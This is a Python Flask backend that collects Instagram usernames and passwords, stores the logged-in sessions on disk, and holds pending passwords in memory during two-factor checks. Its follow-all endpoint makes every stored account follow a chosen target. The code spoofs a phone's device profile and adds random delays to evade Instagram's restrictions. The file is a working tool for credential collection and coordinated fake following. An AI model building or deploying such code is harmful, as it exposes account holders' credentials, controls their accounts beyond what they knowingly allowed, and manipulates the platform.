from flask import Flask, request, jsonify, make_response
from instagrapi import Client
import uuid, threading, os, time, random

app = Flask(__name__, static_folder='.', static_url_path='')

pending_sessions = {}
pending_lock = threading.Lock()

# -----------------------------
# Create sessions folder
# -----------------------------
if not os.path.exists("sessions"):
    os.mkdir("sessions")


def make_session_id():
    return uuid.uuid4().hex


# -----------------------------
# Serve index.html (no cache)
# -----------------------------
@app.route('/')
def index():
    path = os.path.join(app.root_path, 'index.html')
    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()
    resp = make_response(content)
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    return resp


# -----------------------------
# Save Session
# -----------------------------
def save_session(username, cl):
    cl.dump_settings(f"sessions/{username}.json")


# -----------------------------
# Load Session (Safe)
# -----------------------------
def load_session(username):
    session_path = f"sessions/{username}.json"
    if not os.path.exists(session_path):
        return None

    try:
        cl = Client()
        cl.load_settings(session_path)
        # Safe validation without password
        cl.user_info(cl.user_id)
        return cl
    except Exception as e:
        print(f"Invalid session {username}: {e}")
        try:
            os.remove(session_path)
        except:
            pass
        return None


# -----------------------------
# LOGIN API
# -----------------------------
@app.route('/api/login', methods=['POST'])
def login_user():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')

        if not username or not password:
            return jsonify({'error': 'Missing username or password'}), 400

        old_cl = load_session(username)
        if old_cl:
            return jsonify({
                'ok': True,
                'message': f'Session Loaded for {username}',
                'redirect': '/follow.html'
            })

        cl = Client()
        cl.set_device({
            "app_version": "289.0.0.20.75",
            "android_version": "30",
            "android_release": "11",
            "dpi": "440dpi",
            "resolution": "1080x2340",
            "manufacturer": "Samsung",
            "device": "SM-G991B",
            "model": "Galaxy S21",
            "cpu": "exynos2100",
            "version_code": "289000020"
        })

        try:
            cl.login(username, password)
            save_session(username, cl)
            return jsonify({
                'ok': True,
                'message': f'Login saved for {username}',
                'redirect': '/follow.html'
            })

        except Exception as ex:
            text = str(ex).lower()
            sid = make_session_id()
            if any(x in text for x in ['two-factor', 'verification_code', 'two factor']):
                with pending_lock:
                    pending_sessions[sid] = {'username': username, 'password': password}
                return jsonify({'two_factor_required': True, 'session_id': sid})

            if 'challenge' in text:
                with pending_lock:
                    pending_sessions[sid] = {'username': username, 'password': password}
                return jsonify({'challenge_required': True, 'session_id': sid})

            return jsonify({'error': 'login_failed', 'message': str(ex)}), 500

    except Exception as e:
        return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500


# -----------------------------
# FOLLOW ALL USERS (Safe + Success Only)
# -----------------------------
@app.route('/api/follow-all', methods=['POST'])
def follow_all_users():
    try:
        data = request.get_json()
        target_user = data.get("target")

        if not target_user:
            return jsonify({'error': 'Target missing'}), 400

        # Load all sessions
        files = os.listdir("sessions")
        if not files:
            return jsonify({'error': 'No saved sessions found'}), 400

        clients = []
        for f in files:
            if f.endswith(".json"):
                username = f.replace(".json", "")
                cl = load_session(username)
                if cl:
                    clients.append((username, cl))

        if not clients:
            return jsonify({'ok': False, 'message': 'No valid sessions to follow'}), 200

        # Get target ID using safe method
        first_cl = clients[0][1]
        try:
            info = first_cl.user_info_by_username_v1(target_user)
            target_id = info.pk
        except Exception as e:
            return jsonify({'ok': False, 'message': f"Failed to get target user ID: {e}"}), 400

        success_users = []

        for username, cl in clients:
            try:
                cl.user_follow(target_id)
                success_users.append(username)
                print(f"Followed {target_user} from {username}")
                time.sleep(random.randint(6, 12))  # longer random delay
            except Exception as e:
                print(f"Follow failed for {username}: {e}")
                continue  # skip account if restricted

        if len(success_users) == 0:
            return jsonify({
                'ok': False,
                'message': 'All follows failed. Instagram may have restricted actions.'
            }), 200

        return jsonify({
            'ok': True,
            'success_count': len(success_users),
            'users': success_users
        })

    except Exception as e:
        return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500


# -----------------------------
# Run App
# -----------------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
